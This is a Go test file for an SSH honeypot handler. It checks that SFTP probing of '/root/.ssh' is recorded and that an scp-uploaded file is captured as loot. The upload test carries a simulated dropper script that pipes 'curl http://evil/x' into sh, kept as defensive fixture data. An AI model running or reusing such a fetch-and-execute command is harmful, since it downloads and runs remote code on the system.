package handler

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"testing"
	"time"

	xssh "golang.org/x/crypto/ssh"

	"github.com/rom/tarpit-honeypot/internal/archetype"
	"github.com/rom/tarpit-honeypot/internal/config"
)

// dialSSHForXfer authenticates (the handler accepts the 3rd attempt) and returns
// the live SSH connection for raw channel use.
func dialSSHForXfer(t *testing.T, client net.Conn) xssh.Conn {
	t.Helper()
	cfg := &xssh.ClientConfig{
		User: "admin",
		Auth: []xssh.AuthMethod{
			xssh.RetryableAuthMethod(xssh.PasswordCallback(func() (string, error) { return passwordSeries(), nil }), 5),
		},
		HostKeyCallback: xssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}
	c, chans, reqs, err := xssh.NewClientConn(client, "host:22", cfg)
	if err != nil {
		t.Fatalf("ssh client conn: %v", err)
	}
	go xssh.DiscardRequests(reqs)
	go func() {
		for nc := range chans {
			_ = nc.Reject(xssh.Prohibited, "")
		}
	}()
	return c
}

// An SFTP client must see a live server (INIT->VERSION) so it proceeds and
// reveals the path it probes; the handler records the subsystem + paths.
func TestSSHInteractiveSFTPBeginning(t *testing.T) {
	client, server := loopbackPair(t)
	h := &sshInteractive{arch: archetype.Lookup("debian 12"), dir: t.TempDir()}
	resC := make(chan Result, 1)
	go func() {
		res, _ := h.Handle(context.Background(), server, config.Listener{Handler: "ssh_interactive"})
		resC <- res
	}()

	c := dialSSHForXfer(t, client)
	ch, reqs, err := c.OpenChannel("session", nil)
	if err != nil {
		t.Fatalf("open channel: %v", err)
	}
	go xssh.DiscardRequests(reqs)

	ok, err := ch.SendRequest("subsystem", true, sftpStringBytes("sftp"))
	if err != nil || !ok {
		t.Fatalf("subsystem request: ok=%v err=%v", ok, err)
	}
	cbr := bufio.NewReader(ch)
	// SSH_FXP_INIT (type 1) with version 3.
	writeSFTPPacket(ch, sftpFxpInit, sftpU32(3))
	if pt, _, err := readSFTPPacket(cbr); err != nil || pt != sftpFxpVersion {
		t.Fatalf("want FXP_VERSION, got type=%d err=%v", pt, err)
	}
	// REALPATH for "/root/.ssh" — should come back as a NAME and be recorded.
	body := append(sftpU32(1), sftpStringBytes("/root/.ssh")...)
	writeSFTPPacket(ch, sftpFxpRealpath, body)
	if pt, _, err := readSFTPPacket(cbr); err != nil || pt != sftpFxpName {
		t.Fatalf("want FXP_NAME, got type=%d err=%v", pt, err)
	}
	_ = ch.Close()
	_ = c.Close()

	res := <-resC
	if res.Meta["ssh_subsystem"] != "sftp" {
		t.Errorf("ssh_subsystem = %v; want sftp", res.Meta["ssh_subsystem"])
	}
	if !containsStr(metaAnoms(res), "sftp-session") {
		t.Errorf("sftp-session anomaly missing: %v", metaAnoms(res))
	}
	paths, _ := res.Meta["sftp_paths"].([]string)
	found := false
	for _, p := range paths {
		if p == "/root/.ssh" {
			found = true
		}
	}
	if !found {
		t.Errorf("sftp_paths did not record the probed path: %v", paths)
	}
}

// An scp upload (`scp -t`) must capture the filename/size and a chunk of the
// dropper content as loot.
func TestSSHInteractiveSCPUpload(t *testing.T) {
	client, server := loopbackPair(t)
	h := &sshInteractive{arch: archetype.Lookup("debian 12"), dir: t.TempDir()}
	resC := make(chan Result, 1)
	go func() {
		res, _ := h.Handle(context.Background(), server, config.Listener{Handler: "ssh_interactive"})
		resC <- res
	}()

	c := dialSSHForXfer(t, client)
	ch, reqs, err := c.OpenChannel("session", nil)
	if err != nil {
		t.Fatalf("open channel: %v", err)
	}
	go xssh.DiscardRequests(reqs)

	if ok, err := ch.SendRequest("exec", true, sftpStringBytes("scp -t /tmp/x.sh")); err != nil || !ok {
		t.Fatalf("exec request: ok=%v err=%v", ok, err)
	}
	cbr := bufio.NewReader(ch)
	if b, err := cbr.ReadByte(); err != nil || b != 0 {
		t.Fatalf("want ready ack 0, got %d err=%v", b, err)
	}
	payload := []byte("#!/bin/sh\ncurl http://evil/x | sh\n")
	fmt.Fprintf(ch, "C0755 %d x.sh\n", len(payload))
	if b, err := cbr.ReadByte(); err != nil || b != 0 {
		t.Fatalf("want header ack 0, got %d err=%v", b, err)
	}
	_, _ = ch.Write(payload)
	_, _ = ch.Write([]byte{0}) // scp end-of-file
	_, _ = cbr.ReadByte()      // trailing warning byte from us
	_ = ch.Close()
	_ = c.Close()

	res := <-resC
	if res.Meta["scp_mode"] != "upload" {
		t.Errorf("scp_mode = %v; want upload", res.Meta["scp_mode"])
	}
	if res.Meta["scp_filename"] != "x.sh" {
		t.Errorf("scp_filename = %v; want x.sh", res.Meta["scp_filename"])
	}
	if !containsStr(metaAnoms(res), "scp-upload") {
		t.Errorf("scp-upload anomaly missing: %v", metaAnoms(res))
	}
	if string(res.Payload) != string(payload) {
		t.Errorf("captured upload = %q; want %q", res.Payload, payload)
	}
}
